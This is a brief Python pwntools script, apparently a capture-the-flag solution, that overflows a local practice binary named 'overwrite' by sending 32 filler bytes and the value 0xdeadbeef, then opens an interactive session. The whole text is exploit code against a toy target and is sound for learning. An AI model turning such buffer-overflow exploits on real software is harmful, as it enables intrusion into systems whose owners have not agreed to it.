from pwn import *

io = process('./overwrite')

io.recvuntil(b'?')

payload = b'a' * 32
payload += p32(0xdeadbeef)

log.info(f"Payload: {payload}")

io.sendline(payload)

io.interactive()
